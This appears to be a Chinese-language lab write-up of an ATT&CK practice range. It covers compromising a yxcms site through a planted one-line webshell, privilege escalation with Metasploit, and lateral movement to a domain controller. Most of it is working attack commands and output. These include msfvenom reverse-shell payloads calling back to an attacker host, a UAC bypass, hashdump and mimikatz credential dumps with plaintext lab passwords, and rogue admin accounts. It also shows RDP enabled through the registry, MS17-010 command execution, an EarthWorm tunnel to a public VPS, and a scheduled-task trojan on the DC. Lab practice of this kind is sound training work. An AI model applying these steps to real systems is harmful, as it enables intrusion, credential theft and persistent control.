

# 利用思路(kill chain)

漏洞利用-->内网搜索-->横向渗透-->构建通道-->持久控制-->痕迹清理

# 第一步：利用yxcms获取webshell

第一步阅读官方文档发现后台地址与默认登录用户名与密码

https://www.kancloud.cn/yongheng/yxcms/308093

进入后台，在后台模板

http://192.168.5.106/yxcms/index.php?r=admin/index/index#增加index_index.php里面挂一句话木马

在首页即可getshell，查看权限发现为管理员权限

![](H:\靶场\ATT&CK实战系列\学习过程\第一个\图片\step1-1.png)

# 第二步：通过webshell拿到主机权限再获取高权限

### 信息搜集

```
ipconfig /all 查看本机ip所在域
route print   打印路由信息
net view	  查看局域网内其他主机
arp -a 		  查看arp缓存
net start	  查看开启了哪些服务
net share	  查看开启了那些共享
net share ipc$开启ipc共享
net share c$  开启c盘共享
net config workstation 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user      查看本机用户列表
net user /domain      查看域用户
net localgroup administrators  查看本地管理员组（通常会有域用户）
net view /domain  	查看有几个域
net user 用户名 /domain 收集指定域用户的信息
net group /domain  查看域里面的工作组，查看把用户分了多少组(只能在域控上操作)
net group 组名 /domain  查看域种某工作组
net group "domain admins" /domain 查看域管理员的名字
net group "domain computer" /domain 查看域中的其他主机
net group "domain controllers" /domain 查看域控制器(可能有多台)
```

![image-20200618230841275](https://i0.hdslb.com/bfs/article/9ed3de7c39e8a74efa8ef3b3fe56b2333ef58aec.png@1320w_948h.webp)

![image-20200618230841275](https://i0.hdslb.com/bfs/article/9ed3de7c39e8a74efa8ef3b3fe56b2333ef58aec.png@1320w_948h.webp)

新增管理员用户

```
net user whoami Y4tacker1 /add
net user localgroup administrators /add
```

开启3389端口

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```



### 提权

接下来利用msf生成马子

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.111.129 LPORT=50000 -f exe -o openme.exe
msfvenom -p cmd/unix/reverse_python LHOST=192.168.111.129 LPORT=50000 -f raw > shell.py

```

或者

```
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '\x00' lhost=192.168.111.129 lport=50000 -f exe > payload.exe
```

kali当中输入

```
use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 192.168.111.129
lhost => 192.168.111.129
msf6 exploit(multi/handler) > set lport 50000
lport => 50000
msf6 exploit(multi/handler) > exploit -z -j
使用exploit -j -z可在后台持续监听,-j为后台任务,-z为持续监听
```

之后开启

![](H:\靶场\ATT&CK实战系列\学习过程\第一个\图片\step1-2.png)

有个bug是我payload不对

```
最好还是用下面这个 我session -i 1进不去

set payload windows/meterpreter/reverse_tcp
```

之后查看系统信息，发现是32位windows系统

```
meterpreter > sysinfo
Computer        : STU1
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : zh_CN
Domain          : GOD
Logged On Users : 2
Meterpreter     : x86/windows
```

### 系统信息收集

下一步查看当前用户身份

```
terpreter > getuid
Server username: GOD\Administrator
```

下一步查看当前用户具备的权限，我备注一些关键权限

```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege						允许直接遍历
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege				增加进程工作集 
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege							时区
SeUndockPrivilege							将计算机中dock中删除。 允许用户使用Eject PC从坞中将计算机移出，默认情况下Administrators, Power Users, Users均有此特 权。 
```

如果以后exe被杀调，可用cobalt strike二次改造

### Bypassuac

直接提权失败

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

尝试的第一种方式

```
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
GOD\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter > impersonate_token NT AUTHORITY\SYSTEM
[-] User token NT not found
```

之后第二种方式成功了

首先将session挂到后台使用命令background

```
msf > use exploit/windows/local/bypassuac
msf exploit windows/local/bypassuac) > set session 1
msf6 exploit(windows/local/bypassuac) > exploit 

[*] Started reverse TCP handler on 192.168.111.129:4444 
[-] Exploit aborted due to failure: none: Already in elevated state
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/bypassuac) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ STU1  192.168.111.129:50000 -> 192.168.111.128:1064 (192.168.111.128)
  2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ STU1  192.168.111.129:50000 -> 192.168.111.128:1065 (192.168.111.128)

```

之后看上面information部分这就是最高权限

我们查看一下

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

起飞，此时再输入shell，起飞，你将获得具有管理员权限的命令提示符。

```
meterpreter > shell
Process 3676 created.
Channel 1 created.
Microsoft Windows [�汾 6.1.7601]
��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32>

```

不过有乱码输入`chcp 65001`解决控制台乱码

之后我们退出这个界面，返回msfconsole

# 内网主机发现---需要配置路由

## 配置数据库与msf联动加强效率

具体参考这篇文章[msf连接数据库](https://blog.csdn.net/qq_34444097/article/details/79679640)

接下来连接

```
msf6 > db_status 
[*] postgresql selected, no connection
msf6 > db_connect msf:admin@127.0.0.1/msf
Connected to Postgres data service: 127.0.0.1/msf
msf6 > db_status 
[*] Connected to msf. Connection type: postgresql. Connection name: OsNJI373.
```

之后明显速度快了很多

```
msf6 exploit(multi/handler) > search bypassuac

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   1   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   2   exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
```

数据库相关几个常用命令的写法

![](H:\靶场\ATT&CK实战系列\学习过程\第一个\图片\step1-3.png)



之后可以利用开启了数据库快速提取缓冲区的内容

```
msf6 auxiliary(scanner/ssh/ssh_version) > hosts -c address,mac,name,os_name,os_flavor,os_sp,purpose,vuln_count,service_count

Hosts
=====

address          mac  name  os_name    os_flavor     os_sp  purpose  vuln_count  service_count
-------          ---  ----  -------    ---------     -----  -------  ----------  -------------
192.168.111.128       STU1  Windows 7  Professional  SP1    client   2           1

```



## 进入正题--内网存活探测

先使用run *get_local_subnets*命令查看已拿下的目标主机的内网IP段情况

```
meterpreter > run get_local_subnets 

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
Local subnet: 169.254.0.0/255.255.0.0
Local subnet: 192.168.5.0/255.255.255.0
Local subnet: 192.168.52.0/255.255.255.0
Local subnet: 192.168.111.0/255.255.255.0
```

网上说多网卡情况下，需要添加路由进行下一条路探测，直接在shell中进行路由操作，实战中可能有些变化

```
meterpreter > run autoroute -s 192.168.111.0 -n 255.255.255.0

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.168.111.0/255.255.255.0...
[+] Added route to 192.168.111.0/255.255.255.0 via 192.168.111.128
[*] Use the -p option to list all active routes

```

加完以后，我们便可以去探测111网段的主机

```
meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.111.0      255.255.255.0      Session 1
```

开始打工搬砖了开始内网各种存活探测

### smb版本扫描

```
msf6 exploit(windows/local/bypassuac) > use auxiliary/scanner/smb/smb_version 
msf6 auxiliary(scanner/smb/smb_version) > show options 

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.111.128
rhosts => 192.168.111.128
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.111.128:445   - SMB Detected (versions:1, 2) (preferred dialect:SMB 2.1) (signatures:optional) (uptime:1h 53m 22s) (guid:{057f3c7a-5c08-4578-bd60-5997dc42c697}) (authentication domain:GOD)
[+] 192.168.111.128:445   -   Host is running Windows 7 Professional SP1 (build:7601) (name:STU1) (domain:GOD)
[*] 192.168.111.128:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### smb共享枚举（账号、密码）

```
msf6 auxiliary(scanner/smb/smb_version) > use auxiliary/scanner/smb/smb_enumshares 
msf6 auxiliary(scanner/smb/smb_enumshares) > show options 

Module options (auxiliary/scanner/smb/smb_enumshares):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   LogSpider       3                no        0 = disabled, 1 = CSV, 2 = table (txt), 3 = one liner (txt) (Accepted: 0, 1, 2, 3)
   MaxDepth        999              yes       Max number of subdirectories to spider
   RHOSTS                           yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   SMBDomain       .                no        The Windows domain to use for authentication
   SMBPass                          no        The password for the specified username
   SMBUser                          no        The username to authenticate as
   ShowFiles       false            yes       Show detailed information when spidering
   SpiderProfiles  true             no        Spider only user profiles when share = C$
   SpiderShares    false            no        Spider shares recursively
   THREADS         1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_enumshares) > set rhosts 192.168.111.128
rhosts => 192.168.111.128
msf6 auxiliary(scanner/smb/smb_enumshares) > run

[-] 192.168.111.128:139   - Login Failed: Unable to negotiate SMB1 with the remote host: Not a valid SMB packet

[-] 192.168.111.128:445   - Login Failed: Unable to negotiate SMB1 with the remote host: Read timeout expired when reading from the Socket (timeout=60)
[*] 192.168.111.128:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 检查目标是否启用了WebDAV

```
msf6 auxiliary(scanner/smb/smb_enumshares) > use auxiliary/scanner/http/webdav_scanner 
msf6 auxiliary(scanner/http/webdav_scanner) > show options 

Module options (auxiliary/scanner/http/webdav_scanner):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /                yes       Path to use
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads (max one per host)
   VHOST                     no        HTTP server virtual host

msf6 auxiliary(scanner/http/webdav_scanner) > set rhosts 192.168.111.128
rhosts => 192.168.111.128
msf6 auxiliary(scanner/http/webdav_scanner) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### http是否开启put功能

```
msf6 auxiliary(scanner/http/webdav_scanner) > use auxiliary/scanner/http/http_put 
msf6 auxiliary(scanner/http/http_put) > set rhosts 192.168.111.128
rhosts => 192.168.111.128
msf6 auxiliary(scanner/http/http_put) > run

[-] 192.168.111.128: File doesn't seem to exist. The upload probably failed
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Windows远程桌面服务漏洞(CVE-2019-0708)

```
msf6 auxiliary(scanner/http/http_put) > use auxiliary/scanner/rdp/rdp_scanner 
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 192.168.111.128
rhosts => 192.168.111.128
msf6 auxiliary(scanner/rdp/rdp_scanner) > run

[*] 192.168.111.128:3389  - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### SSH版本扫描

```
msf6 auxiliary(scanner/rdp/rdp_scanner) > use auxiliary/scanner/ssh/ssh_version 
msf6 auxiliary(scanner/ssh/ssh_version) > set rhosts 192.168.111.128
rhosts => 192.168.111.128
msf6 auxiliary(scanner/ssh/ssh_version) > run

[*] 192.168.111.128:22    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

### 当然还有很多就不体验了，主要是菜不知道干嘛

## 内网攻击姿势-ms17-010失败(session很容易就挂掉了)

```
msf6 exploit(multi/handler) > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set threads 10
threads => 10
msf6 auxiliary(scanner/smb/smb_ms17_010) > set rhosts 192.168.117.130/24
rhosts => 192.168.117.130/24
msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit 
[-] 192.168.117.1:445     - An SMB Login Error occurred while connecting to the IPC$ tree.
[+] 192.168.117.128:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (64-bit)
[+] 192.168.117.130:445   - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[-] 192.168.117.129:445   - An SMB Login Error occurred while connecting to the IPC$ tree.

```

通过扫描结果发现`192.168.117.128:445   - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (64-bit)`

查询合适的exp

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > search ms17-010

Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
```

# 使用rdesktop打开远程桌面

首先提权，因为是administrators，所以很简单

```
meterpreter > getuid
Server username: GOD\Administrator
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

关闭防火墙

```
meterpreter > run post/windows/manage/enable_rdp 

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /root/.msf4/loot/20201226054312_default_192.168.111.128_host.windows.cle_345278.txt
```

之后使用rdesktop打开远程桌面

```
op 192.168.111.128
Autoselecting keyboard map 'en-us' from locale
```

# 破解密码

抓一下hash

```
erpreter > hashdump 
[-] 2007: Operation failed: The parameter is incorrect.
```

```
meterpreter > run post/windows/gather/hashdump

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
whoami:1002:aad3b435b51404eeaad3b435b51404ee:27bb1c5ee90d9ac35a5bb53ffc20c8a8:::
或者
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against STU1
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20201226055012_default_192.168.111.128_windows.hashes_744608.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*]     Obtaining the boot key...
[*]     Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...
[*]     Obtaining the user list and keys...
[*]     Decrypting user keys...
[*]     Dumping password hints...
[*]     No users with password hints on this system
[*]     Dumping password hashes...
[+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+]     whoami:1002:aad3b435b51404eeaad3b435b51404ee:27bb1c5ee90d9ac35a5bb53ffc20c8a8:::
```

```
meterpreter > upload /root/Desktop/mimikatz.exe c:\\
meterpreter > shell
C:\>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 

```



# 其他知识点

## 如何关闭端口占用

Windows 使用 netstat -ano查看端口使用情况  kill port 关闭进程

Linux 使用 netstat -tulpen 查看端口使用情况 也可以指定查看某个端口 netstat -tulpen | grep 4444   fuser -k port/tcp 关闭进程

  lsof -i:80

   sudo kill -9 PID

## metasploit的session操作

```
msf > sessions -l

Active sessions
===============

  Id  Type                   Information                            Connection
  --  ----                   -----------                            ----------
  1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ ROOT-9743DD32E3  192.168.1.11:4444 -> 192.168.1.142:1063 (192.168.1.142)

msf > sessions -i 1
[*] Starting interaction with 1...

meterpreter > pwd
C:\
meterpreter > 
```

开始抓密码，得到明文密码

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
SID               : S-1-5-21-2952760202-1353902439-2381784089-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : GOD
         * LM       : edea194d76c77d87840ac10a764c7362
         * NTLM     : 8a963371a63944419ec1adf687bb1be5
         * SHA1     : 343f44056ed02360aead5618dd42e4614b5f70cf
        tspkg :
         * Username : Administrator
         * Domain   : GOD
         * Password : hongrisec@2019
        wdigest :
         * Username : Administrator
         * Domain   : GOD
         * Password : hongrisec@2019
        kerberos :
         * Username : Administrator
         * Domain   : GOD.ORG
         * Password : hongrisec@2019

```

# 横向移动

我们用以下方法探测内网存活的主机

```
 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.117.%I | findstr "TTL="
```

以下是结果(当然我们上面用msf也能探测，多一种方法多一种思路)

```
C:\Windows\system32> for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.117.%I | findstr "TTL="
 for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.117.%I | findstr "TTL="
Reply from 192.168.117.1: bytes=32 time<1ms TTL=128
Reply from 192.168.117.128: bytes=32 time<1ms TTL=128
Reply from 192.168.117.129: bytes=32 time<1ms TTL=128
Reply from 192.168.117.130: bytes=32 time<1ms TTL=128
```

之前我们使用ms17-010失败了，网上师傅说

```
打2003有时候多次执行后msf就接收不到session，而且ms17-010利用时，server 2003很容易就蓝屏了。可以尝试了一下github上的windows 2003 – windows 10全版本的msf 17-010脚本（ms17_010_eternalblue_doublepulsar）。我们可以尝试直接打开该主机的远程桌面，由于该主机处于内网，我们的攻击机相对之处于外网，无法直接与内网中的主机通信，所以我们需要用Earthworm做Socks5代理作为跳板进入内网获取更多主机。
```

公网vps上开启，添加一个转接隧道，监听1234，把本地1234端口收到的代理请求转交给1080端口，这里1234端口只是用于传输流量。

```
root@VM-4-9-ubuntu:~/ywh# chmod 777 ./ew_for_linux64 
root@VM-4-9-ubuntu:~/ywh# ./ew_for_linux64 -s rcsocks -l 1080 -e 1234
rcsocks 0.0.0.0:1080 <--[10000 usec]--> 0.0.0.0:1234
init cmd_server_for_rc here
start listen port here
```

之后上传ew_for_Win.exe到win7受害主机，并在win7上面启动socks5服务器并反弹到vps上面

```
 ew_for_Win.exe -s rssocks -d 42.192.137.212 -e 1234
```

此时公网vps会弹出执行成功

```
rssocks cmd_socket OK!
```

再配置好proxychains：

```
vim /etc/proxychains4.conf
最后一行
[ProxyList]
socks5 42.192.137.212 1080
```

这样内网主机win2003就可以通过vps与攻击机kali通信了，这里要知道，我们在msf上设置路由是为了让msf可以通信到内网其他主机；而我们设置代理是为了让攻击机上的其他工具可以通信到到内网的其他主机。

用nmap扫描win2003的3389端口，发现其没有开启：

```
 proxychains4 nmap -p 3389 -Pn -sT 192.168.117.128 # -Pn和-sT必须要有
 PORT     STATE  SERVICE
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
```

我们用auxiliary/admin/smb/ms17_010_command模块执行命令将其开启：

并添加一个新用户使用net命令

```
net user whamy Ywh!23456 /add
net localgroup administrators whamy /add
```

命令行启用3389端口

```
meterpreter > use auxiliary/admin/smb/ms17_010_command
Loading extension auxiliary/admin/smb/ms17_010_command...
[-] Failed to load extension: Unable to load extension 'auxiliary/admin/smb/ms17_010_command' - module does not exist.
meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use auxiliary/admin/smb/ms17_010_command
msf6 auxiliary(admin/smb/ms17_010_command) > set rhosts 192.168.117.128
rhosts => 192.168.117.128
msf6 auxiliary(admin/smb/ms17_010_command) > set CO
set COMMAND         set CONNECTTIMEOUT  set CONSOLELOGGING  
msf6 auxiliary(admin/smb/ms17_010_command) > set CO
set COMMAND         set CONNECTTIMEOUT  set CONSOLELOGGING  
msf6 auxiliary(admin/smb/ms17_010_command) > set COMMAND REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
COMMAND => REG ADD HKLMSYSTEMCurrentControlSetControlTerminal Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
msf6 auxiliary(admin/smb/ms17_010_command) > run

[-] 192.168.117.128:445   - Rex::HostUnreachable: The host (192.168.117.128:445) was unreachable.
[*] 192.168.117.128:445   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(admin/smb/ms17_010_command) > 
```

此时再次扫描就会发现其状态开启

之后

```
root@kali:~/桌面# proxychains rdesktop 192.168.117.128
```

就可以访问内网主机了

```
run post/windows/gather/enum_patches模块可以查看是否打了补丁
```

# 实现域控

先用win7连接域控的c盘共享

```
 net use \\192.168.52.128\c$ "wenhaosec@2020" /user:"administrator"
```

使用dir 就可以查看域控的资源了。

将win7主机上的shell.exe上传到域控上

```
 copy c:\phpstudy\www\yxcms\shell.exe \\192.168.52.128\c$ 
```

设置一个任务计划，定时启动木马之后就能够获取域控的shell了

```
shell schtasks /create /tn "test" /tr C:\shell.exe /sc once /st 18:05 /S 192.168.52.128 /RU System  /u administrator /p "wenhaosec@2020"
```

## 提权

windows-ms系列 补丁ks 没有修补 直接上官网找相应ms

linux kerneal  .c 通过gun把.c作为一个可执行文件 做linux提权 去exploit-db找exp利用

# 参考文章

[Kali系列之multi/handler(渗透win7)](https://www.cnblogs.com/chenglee/p/8820406.html)

[记一次Windows渗透提权历程](https://www.baidu.com/link?url=keFDCp9kg9oaRAE-zChX_RCLnrs_d8QFLriaFqPSwJ7nAA8tW7oHCPyp8JFLhUVu&wd=&eqid=a9a9597e00000eb9000000065fe5ef52)

[使用Metasploit绕过UAC的多种方法](https://www.freebuf.com/articles/system/185311.html)

[meterpreter会话渗透利用常用的32个命令归纳小结](https://www.cnblogs.com/ssooking/p/6192995.html)

[kali auxiliary扫描常用模块总结笔记](https://blog.csdn.net/weixin_44067239/article/details/106984678)

[[二进制安全] 内网穿透大杀器--EarthWorm heatlevel](https://bbs.ichunqiu.com/thread-36219-1-2.html)

[CMD开启/关闭3389端口方法](https://blog.csdn.net/qin9800/article/details/105159125)